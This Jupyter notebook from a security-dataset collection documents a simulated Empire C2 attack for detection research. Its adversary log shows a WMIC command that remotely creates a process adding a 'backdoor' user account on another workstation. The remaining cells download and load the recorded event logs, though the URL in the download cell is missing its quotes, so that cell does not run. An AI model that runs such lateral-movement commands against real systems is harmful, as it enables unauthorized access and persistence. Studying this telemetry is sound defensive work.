{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "4ff0f782",
   "metadata": {},
   "source": [
    "# Empire Remote WMIC Add User"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2f79aa67",
   "metadata": {},
   "source": [
    "## Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "96c10d48",
   "metadata": {},
   "source": [
    "\n",
    "|                   |    |\n",
    "|:------------------|:---|\n",
    "| Contributors      | Roberto Rodriguez @Cyb3rWard0g |\n",
    "| Creation Date     | 2020/09/14 |\n",
    "| Modification Date | 2020/09/22 |\n",
    "| Tactics           | [TA0002](https://attack.mitre.org/tactics/TA0002),[TA0008](https://attack.mitre.org/tactics/TA0008) |\n",
    "| Techniques        | [T1047](https://attack.mitre.org/techniques/T1047) |\n",
    "| Tags              | WMI IWbemServices ExecMethod,User Backdoor |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2b8a19e4",
   "metadata": {},
   "source": [
    "## Dataset Description\n",
    "This dataset represents an adversary remotely executing code via WMI to ad a backdoor user on the target system. This dataset focuses on the use of the WMI Win32_Process class and method Create to execute code remotely."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "849fabe8",
   "metadata": {},
   "source": [
    "## Datasets Downloads"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "42fd3d5c",
   "metadata": {},
   "source": [
    "\n",
    "| Type | Link   |\n",
    "|:-------------|:-------|\n",
    "| Host | [https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_wmic_add_user_backdoor.zip](https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_wmic_add_user_backdoor.zip) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9d69d843",
   "metadata": {},
   "source": [
    "## Simulation Metadata"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "59e9afe4",
   "metadata": {},
   "source": [
    "### Tools"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "dfb020b9",
   "metadata": {},
   "source": [
    "\n",
    "| type | Name | Module |\n",
    "|:-----|:-----|--------|\n",
    "| C2 | Empire | [shell](None) |"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2484b2d7",
   "metadata": {},
   "source": [
    "## Adversary View\n",
    "```\n",
    "(Empire: agents) > \n",
    "[*] Sending POWERSHELL stager (stage 1) to 172.18.39.5\n",
    "[*] New agent 6Z78CY25 checked in\n",
    "[+] Initial agent 6Z78CY25 from 172.18.39.5 now active (Slack)\n",
    "[*] Sending agent (stage 2) to 6Z78CY25 at 172.18.39.5\n",
    "agents\n",
    "\n",
    "[*] Active agents:\n",
    "\n",
    "Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n",
    "----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n",
    "KFL6CMNZ ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7584   5/0.0    2020-09-14 11:33:59  http            \n",
    "YGBLW8EM ps 172.18.39.5     WORKSTATION5      *THESHIRE\\wardog        powershell         8924   5/0.0    2020-09-14 11:40:53  http            \n",
    "UBCKLYFA ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5412   5/0.0    2020-09-14 11:57:16  http            \n",
    "\n",
    "6Z78CY25 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         9564   5/0.0    2020-09-14 12:02:08  http            \n",
    "\n",
    "(Empire: agents) > interact 6Z78CY25\n",
    "(Empire: 6Z78CY25) > \n",
    "(Empire: 6Z78CY25) > shell wmic /node:WORKSTATION6 process call create \"net user /add backdoor pa$$w0rd1\"\n",
    "[*] Tasked 6Z78CY25 to run TASK_SHELL\n",
    "[*] Agent 6Z78CY25 tasked with task ID 1\n",
    "(Empire: 6Z78CY25) > \n",
    "Executing (Win32_Process)->Create()\n",
    "\n",
    "Method execution successful.\n",
    "\n",
    "Out Parameters:\n",
    "instance of __PARAMETERS\n",
    "{\n",
    "  ProcessId = 7768;\n",
    "  ReturnValue = 0;\n",
    "};\n",
    "\n",
    "..Command execution completed.\n",
    "\n",
    "(Empire: 6Z78CY25) >\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d025076a",
   "metadata": {},
   "source": [
    "## Explore Datasets"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5dc26a1d",
   "metadata": {},
   "source": [
    "### Download & Decompress Dataset"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b7f7dd4b",
   "metadata": {},
   "outputs": [],
   "source": [
    "import requests\n",
    "from zipfile import ZipFile\n",
    "from io import BytesIO\n",
    "\n",
    "url = https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/lateral_movement/host/empire_wmic_add_user_backdoor.zip\n",
    "zipFileRequest = requests.get(url)\n",
    "zipFile = ZipFile(BytesIO(zipFileRequest.content))\n",
    "datasetJSONPath = zipFile.extract(zipFile.namelist()[0])"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cae87dbd",
   "metadata": {},
   "source": [
    "### Read JSON File"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "9152937f",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pandas.io import json\n",
    "\n",
    "df = json.read_json(path_or_buf=datasetJSONPath, lines=True)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ba4fb787",
   "metadata": {},
   "source": [
    "### Access Security Events"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "db1fdf61",
   "metadata": {},
   "outputs": [],
   "source": [
    "df.groupby(['Channel']).size().sort_values(ascending=False)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55599ba7",
   "metadata": {},
   "source": [
    "## References\n",
    "* [https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/](https://blog.f-secure.com/endpoint-detection-of-remote-service-creation-and-psexec/) "
   ]
  }
 ],
 "metadata": {},
 "nbformat": 4,
 "nbformat_minor": 5
}
